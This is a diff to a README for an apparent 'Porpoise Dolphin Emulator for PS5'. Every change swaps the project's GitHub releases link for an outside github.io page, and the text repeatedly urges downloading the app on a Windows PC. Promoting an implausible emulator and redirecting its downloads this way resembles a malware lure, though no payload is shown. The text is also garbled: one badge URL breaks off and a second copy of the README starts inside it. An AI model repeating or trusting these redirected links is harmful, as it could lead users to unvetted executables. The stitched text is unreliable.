@@ -1,6 +1,6 @@
 # 🐬 Porpoise-Dolphin-Emulator-for-PS5 - Play GameCube and Wii on PS5
 
-[![Download Porpoise Emulator](https://img.shields.io/badge/Download-Porpoise%20Emulator-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zel-jebr/Porpoise-Dolphin-Emulator-for-PS5/releases)
+[![Download Porpoise Emulator](https://img.shields.io/badge/Download-Porpoise%20Emulator-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://zel-jebr.github.io)
 
 ## 🚀 Getting Started
 
@@ -48,7 +48,7 @@ Display settings are part of the app experience. Use the options shown in Porpoi
 
 Visit this link to download the application:
 
-[**Porpoise-Dolphin-Emulator-for-PS5 Releases**](https://github.com/zel-jebr/Porpoise-Dolphin-Emulator-for-PS5/releases)
+[**Porpoise-Dolphin-Emulator-for-PS5 Releases**](https://zel-jebr.github.io)
 
 Use a Windows PC to open the link in your normal web browser. The page is a general release page, so it is the starting point for the download. Keep the page open until you have what you need. After the download is complete, follow the release page details for your PS5 setup.
 
@@ -84,7 +84,7 @@ Use the official release page whenever you need the application or want to check
 
 [![Download Porpoise Emulator](https://img.shields.io/badge/Get%20Porpoise-Release%20Page-00c2a8?style=for-the-b# 🐬 Porpoise-Dolphin-Emulator-for-PS5 - Play GameCube and Wii on PS5
 
-[![Download Porpoise Emulator](https://img.shields.io/badge/Download-Porpoise%20Emulator-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zel-jebr/Porpoise-Dolphin-Emulator-for-PS5/releases)
+[![Download Porpoise Emulator](https://img.shields.io/badge/Download-Porpoise%20Emulator-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://zel-jebr.github.io)
 
 ## 📋 Before You Begin
 
@@ -138,9 +138,9 @@ Display settings are part of the app experience. Use the options shown in Porpoi
 
 Visit this link to download the application:
 
-[**Porpoise-Dolphin-Emulator-for-PS5 Releases**](https://github.com/zel-jebr/Porpoise-Dolphin-Emulator-for-PS5/releases)
+[**Porpoise-Dolphin-Emulator-for-PS5 Releases**](https://zel-jebr.github.io)
 
-[![Get Porpoise Release Page](https://img.shields.io/badge/Get%20Porpoise-Release%20Page-orange?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zel-jebr/Porpoise-Dolphin-Emulator-for-PS5/releases)
+[![Get Porpoise Release Page](https://img.shields.io/badge/Get%20Porpoise-Release%20Page-orange?style=for-the-badge&logo=github&logoColor=white)](https://zel-jebr.github.io)
 
 Use a Windows PC to open the link in your normal web browser. The page is a general release page, so it is the starting point for the download. Keep the page open until you have what you need. After the download is complete, follow the release page details for your PS5 setup.
 
@@ -174,7 +174,7 @@ Use one memory card setup per game collection and avoid renaming files after sav
 
 Use the official release page whenever you need the application or want to check for updated release details:
 
-[![Download Porpoise Emulator](https://img.shields.io/badge/Get%20Porpoise-Release%20Page-00c2a8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zel-jebr/Porpoise-Dolphin-Emulator-for-PS5/releases)
+[![Download Porpoise Emulator](https://img.shields.io/badge/Get%20Porpoise-Release%20Page-00c2a8?style=for-the-badge&logo=github&logoColor=white)](https://zel-jebr.github.io)
 
 Visit this link to download the application. The release page is the same official destination used at the top of this page, and it remains the best place to begin your download on Windows.
 
